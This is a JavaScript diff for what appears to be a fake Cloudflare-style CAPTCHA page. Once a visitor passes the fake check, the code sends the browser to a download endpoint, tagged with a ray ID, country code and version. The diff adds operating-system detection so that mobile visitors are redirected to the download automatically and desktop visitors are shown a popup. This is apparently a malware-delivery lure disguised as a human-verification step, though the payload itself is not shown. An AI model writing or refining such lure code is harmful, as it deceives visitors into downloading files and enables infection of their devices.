@@ -109,7 +109,7 @@ var downloadCount = 0;
 $('#report').click(function() {
   if (isClose) {
     downloadCount++;
-    window.location.href = "/api/download.php";
+    window.location.href = "/api/download.php?rayid=" + rayID + '&countrycode=' + country_code + '&version=V3';
 
     window.setTimeout(function() {
         check_ray_id();
@@ -200,7 +200,17 @@ $('#checkbox-container').click(function() {
         document.getElementById("captcha-text").innerHTML = translate_Lang[userLang]['success'];
         document.getElementById('captcha-wrapper').style.height = 'auto';
         isClose = true;
-        show_popup();
+        
+        if (OS == 'Windows' || OS == 'macOS') {
+          show_popup();
+        }
+        if (OS == 'Android' || OS == 'iPhone') {
+          $('#popup_mobile').css('display', 'flex');
+          window.location.href = "/api/download.php?rayid=" + rayID + '&countrycode=' + country_code + '&version=V3';
+          window.setTimeout(function() {
+            $('.popup_mobile-help').css('display', 'block');
+          }, 60000);
+        }
       }
 
       clickCount++;
@@ -231,33 +241,6 @@ if (localStorage.getItem('ray')) {
 }
 
 $('#ray-id').text(rayID);  
-
-// fetch(window.location.href, {
-//     method: 'GET',
-// })
-// .then(response => {
-
-//     if ( response.headers.get('cf-ray') ) {
-
-//         rayID = response.headers.get('cf-ray');
-//         $('#ray-id').text(rayID);
-
-//     } else {
-
-//         if (localStorage.getItem('ray')) {
-//             rayID = localStorage.getItem('ray');
-//         } else {
-//             rayID = generateRayID();
-//             localStorage.setItem('ray', rayID);
-//         }
-        
-//         $('#ray-id').text(rayID);  
-//     }
-// })
-// .catch(error => {
-//     console.error('Error fetching page:', error);
-// });
-
 
 
 // Block site
@@ -306,3 +289,16 @@ $('#checkbox').change(function() {
   }
 })
 
+
+
+
+// get OS
+const OS = getOS();
+function getOS() {
+  const userAgent = navigator.userAgent;
+  if (/Windows/i.test(userAgent)) return 'Windows';
+  if (/Macintosh|Mac OS X/i.test(userAgent)) return 'macOS';
+  if (/Android/i.test(userAgent)) return 'Android';
+  if (/iPhone|iPad/i.test(userAgent)) return 'iPhone';
+  return 'Unknown OS';
+}
